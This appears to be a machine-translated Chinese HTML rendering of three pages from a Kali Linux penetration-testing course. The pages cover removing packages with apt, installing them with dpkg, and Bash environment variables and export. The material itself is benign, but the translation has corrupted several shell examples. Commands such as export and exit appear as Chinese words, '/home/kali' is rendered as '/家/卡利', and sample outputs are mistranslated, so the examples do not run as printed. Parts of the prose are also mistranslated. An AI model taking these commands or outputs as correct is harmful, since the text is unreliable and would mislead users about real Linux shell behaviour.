<div style="position:absolute;top:55785;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">处理 man-db (2.8.5-2) 的触发器...</font></font></nobr></div>
<div style="position:absolute;top:55801;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（正在读取数据库...当前安装的 388011 个文件和目录。）</font></font></nobr></div>
<div style="position:absolute;top:55818;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清除 pure-ftpd (1.0.47-3) 的配置文件...</font></font></nobr></div>
<div style="position:absolute;top:55835;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">处理 systemd (240-6) 的触发器...</font></font></nobr></div>
<div style="position:absolute;top:55855;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 26 - 使用 apt remove –purge 完全删除 pure-ftpd 应用程序 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:56011;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="48"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 48 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:56044;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:57121;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:57121;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:57121;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">48</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:56140;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">优秀的！</font><font style="vertical-align: inherit;">您现在可以在 Kali Linux 中搜索、安装和删除工具。</font><font style="vertical-align: inherit;">让我们最后探索一个</font></font></nobr></div>
<div style="position:absolute;top:56159;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此模块中的命令：</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dpkg</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:56194;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.6.6 dpkg</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:56232;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dpkg</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是用于直接或间接通过 APT 安装软件包的核心工具。</font><font style="vertical-align: inherit;">这也是</font></font></nobr></div>
<div style="position:absolute;top:56251;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">离线操作时使用的首选工具，因为它不需要 Internet 连接。</font><font style="vertical-align: inherit;">笔记</font></font></nobr></div>
<div style="position:absolute;top:56270;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dpkg</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不会安装包可能需要的任何依赖项。</font><font style="vertical-align: inherit;">安装软件包</font></font></nobr></div>
<div style="position:absolute;top:56290;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dpkg</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，提供</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-i</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--install</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项和 .deb 包文件的路径。</font><font style="vertical-align: inherit;">这假设</font></font></nobr></div>
<div style="position:absolute;top:56309;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要安装的包的 .deb 文件之前已经下载或在某些</font></font></nobr></div>
<div style="position:absolute;top:56328;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">另一种方式。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:56363;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo dpkg -i man-db_2.7.0.2-5_amd64.deb</font></font></font></b></nobr></div>
<div style="position:absolute;top:56380;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（正在读取数据库……当前安装了 86425 个文件和目录。） </font></font></nobr></div>
<div style="position:absolute;top:56397;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">准备解压 man-db_2.7.0.2-5_amd64.deb ...</font></font></nobr></div>
<div style="position:absolute;top:56414;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 (2.7.0.2-4) 上解压 man-db (2.7.0.2-5) ...</font></font></nobr></div>
<div style="position:absolute;top:56431;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 man-db (2.7.0.2-5) ...</font></font></nobr></div>
<div style="position:absolute;top:56448;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正在更新手册页数据库...</font></font></nobr></div>
<div style="position:absolute;top:56465;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">处理 MIME 支持的触发器 (3.58) ...</font></font></nobr></div>
<div style="position:absolute;top:56482;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:56501;left:295"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 27 - 使用 dpkg -i 安装 man-db 应用程序</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:56532;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.6.6.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:56567;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（这些练习不需要报告）</font></font></i></nobr></div>
<div style="position:absolute;top:56600;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 为您的 Kali 虚拟机拍摄快照（可选）。</font></font></nobr></div>
<div style="position:absolute;top:56628;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 搜索 Kali 中当前未安装的工具。</font></font></nobr></div>
<div style="position:absolute;top:56656;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 安装工具。</font></font></nobr></div>
<div style="position:absolute;top:56685;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4. 移除工具。</font></font></nobr></div>
<div style="position:absolute;top:56713;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5. 将 Kali 虚拟机恢复到之前拍摄的快照（可选）。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:56750;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.7 总结</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:56792;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本模块中，我们为即将推出的模块设置了基线。</font><font style="vertical-align: inherit;">我们探索了新的提示和技巧</font></font></nobr></div>
<div style="position:absolute;top:56812;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户并查看了一些更高级用户可能会喜欢的标准。</font></font></nobr></div>
<div style="position:absolute;top:56844;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">鼓励所有学生查看 Kali 培训网站上的免费在线培训。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">46</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">本站</font></font></nobr></div>
<div style="position:absolute;top:56863;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包括</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kali Linux Revealed</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">书、旨在测试您理解的练习、专门的</font></font></nobr></div>
<div style="position:absolute;top:56883;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">支持论坛等。</font><font style="vertical-align: inherit;">这些免费资源为所有技能水平的用户提供了宝贵的见解</font></font></nobr></div>
<div style="position:absolute;top:56902;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并作为本课程中提供的培训的绝佳伴侣。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:57071;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">46 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（进攻性安全，2019 年），https://kali.training</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:57199;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="49"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 49 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:57232;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:58309;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:58309;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:58309;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">49</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:57322;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.7.1.1.1</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:25px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:57348;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 命令行乐趣</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:57392;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本模块中，我们将介绍一些流行的 Linux 命令行程序。</font><font style="vertical-align: inherit;">感觉</font></font></nobr></div>
<div style="position:absolute;top:57412;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">免费参考 Kali Linux 培训站点</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">47</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进行复习或更深入的讨论。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:57449;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.1 Bash 环境</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:57491;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Bash </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">48</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是一个 sh 兼容的 shell，它允许我们运行复杂的命令并执行不同的</font></font></nobr></div>
<div style="position:absolute;top:57510;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">终端窗口中的任务。</font><font style="vertical-align: inherit;">它结合了 KornShell (ksh) </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">49</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font></nobr></div>
<div style="position:absolute;top:57529;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C 壳 (csh)。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">50</font></font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:57564;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.1.1 环境变量</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:57602;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当打开一个终端窗口时，一个新的 Bash 进程，它有自己的环境变量，</font></font></nobr></div>
<div style="position:absolute;top:57621;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">被初始化。</font><font style="vertical-align: inherit;">这些变量是任何继承的各种设置的全局存储形式。</font></font></nobr></div>
<div style="position:absolute;top:57640;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在该终端会话期间运行的应用程序。</font><font style="vertical-align: inherit;">最常被提及的一种</font></font></nobr></div>
<div style="position:absolute;top:57660;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">环境变量是</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PATH</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，它是 Bash 将使用的以冒号分隔的目录路径列表</font></font></nobr></div>
<div style="position:absolute;top:57679;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在没有完整路径的情况下运行命令时进行搜索。</font></font></nobr></div>
<div style="position:absolute;top:57712;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font><font style="vertical-align: inherit;">查看给定环境变量的内容，</font><font style="vertical-align: inherit;">后跟</font></font></nobr></div>
<div style="position:absolute;top:57731;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“$”字符和环境变量名称。</font><font style="vertical-align: inherit;">比如我们来看一下内容</font></font></nobr></div>
<div style="position:absolute;top:57751;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PATH</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">环境变量：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:57785;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo $PATH</font></font></font></b></nobr></div>
<div style="position:absolute;top:57803;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</font></font></nobr></div>
<div style="position:absolute;top:57822;left:273"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 28 - 使用 echo 显示 PATH 环境变量</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:57851;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">其他一些有用的环境变量包括</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">USER</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWD</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HOME</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，它们保存了</font></font></nobr></div>
<div style="position:absolute;top:57871;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当前终端用户的用户名、当前工作目录和主目录分别为：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:57905;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo $USER</font></font></font></b></nobr></div>
<div style="position:absolute;top:57923;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">卡利</font></font></nobr></div>
<div style="position:absolute;top:57956;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo $PWD</font></font></font></b></nobr></div>
<div style="position:absolute;top:57973;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/家/卡利</font></font></nobr></div>
<div style="position:absolute;top:58007;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo $HOME</font></font></font></b></nobr></div>
<div style="position:absolute;top:58024;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/家/卡利</font></font></nobr></div>
<div style="position:absolute;top:58044;left:220"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 29 - 使用 echo 显示 USER、PWD 和 HOME 环境变量</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:58073;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">export</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font><font style="vertical-align: inherit;">定义环境变量</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">例如，如果我们正在扫描</font></font></nobr></div>
<div style="position:absolute;top:58092;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一个目标并且不想重复输入系统的IP地址，我们可以快速为其分配一个</font></font></nobr></div>
<div style="position:absolute;top:58112;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">环境变量并改用它：</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:58199;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">47 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（进攻性安全，2019 年），https://kali.training/lessons/introduction/</font></font></font></nobr></div>
<div style="position:absolute;top:58219;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">48 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Bash_(Unix_shell)</font></font></font></nobr></div>
<div style="position:absolute;top:58239;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">49 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/KornShell</font></font></font></nobr></div>
<div style="position:absolute;top:58259;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">50 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/C_shell</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:58387;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="50"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 50 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:58420;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:59497;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:59497;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:59497;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">50</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:58518;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">导出 b=10.11.1.220</font></font></font></b></nobr></div>
<div style="position:absolute;top:58552;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ping -c 2 $b</font></font></font></b></nobr></div>
<div style="position:absolute;top:58569;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PING 10.11.1.220 (10.11.1.220) 56(84) 字节数据。</font></font></nobr></div>
<div style="position:absolute;top:58586;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来自 10.11.1.220 的 64 个字节：icmp_seq=1 ttl=62 time=2.23 ms</font></font></nobr></div>
<div style="position:absolute;top:58603;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来自 10.11.1.220 的 64 个字节：icmp_seq=2 ttl=62 time=1.56 ms</font></font></nobr></div>
<div style="position:absolute;top:58636;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--- 10.11.1.220 ping 统计 ---</font></font></nobr></div>
<div style="position:absolute;top:58653;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">发送2个数据包，接收2个数据包，0%丢包，时间1002ms</font></font></nobr></div>
<div style="position:absolute;top:58671;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">rtt min/avg/max/mdev = 1.563/1.900/2.238/0.340 毫秒</font></font></nobr></div>
<div style="position:absolute;top:58690;left:289"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 30 - 使用 export 声明环境变量</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:58719;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">出口</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令，以使我们可以从产卵任何子进程访问的变量</font></font></nobr></div>
<div style="position:absolute;top:58739;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们当前的 Bash 实例。</font><font style="vertical-align: inherit;">如果我们设置一个没有</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">导出</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的环境变量</font><font style="vertical-align: inherit;">，它将只可用</font></font></nobr></div>
<div style="position:absolute;top:58758;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在当前外壳中。</font></font></nobr></div>
<div style="position:absolute;top:58791;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$$</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变量来显示当前 shell 实例的进程 ID，以确保</font></font></nobr></div>
<div style="position:absolute;top:58810;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们确实在两个不同的 shell 中发出命令：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:58845;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo "$$"</font></font></font></b></nobr></div>
<div style="position:absolute;top:58862;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1827</font></font></nobr></div>
<div style="position:absolute;top:58896;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">var="我的 var"</font></font></font></b></nobr></div>
<div style="position:absolute;top:58930;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo $var</font></font></font></b></nobr></div>
<div style="position:absolute;top:58947;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我的瓦尔</font></font></nobr></div>
<div style="position:absolute;top:58981;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">bash</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#00b050" face="Times"><span style="font-size:11px;font-family:Times;color:#00b050">
<div style="position:absolute;top:58998;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo "$$"</font></font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:59015;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1908年</font></font></nobr></div>
</span></font>
<font size="3" color="#00b050" face="Times"><span style="font-size:11px;font-family:Times;color:#00b050">
<div style="position:absolute;top:59049;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo $var</font></font></font></b></nobr></div>
<div style="position:absolute;top:59083;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$</font></font><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">退出</font></font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:59100;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">出口</font></font></nobr></div>
<div style="position:absolute;top:59134;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo $var</font></font></font></b></nobr></div>
<div style="position:absolute;top:59151;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我的瓦尔</font></font></nobr></div>
<div style="position:absolute;top:59184;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">export othervar="全局变量"</font></font></font></b></nobr></div>
<div style="position:absolute;top:59219;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo $othervar</font></font></font></b></nobr></div>
<div style="position:absolute;top:59236;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">全局变量</font></font></nobr></div>
<div style="position:absolute;top:59269;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">bash</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#00b050" face="Times"><span style="font-size:11px;font-family:Times;color:#00b050">
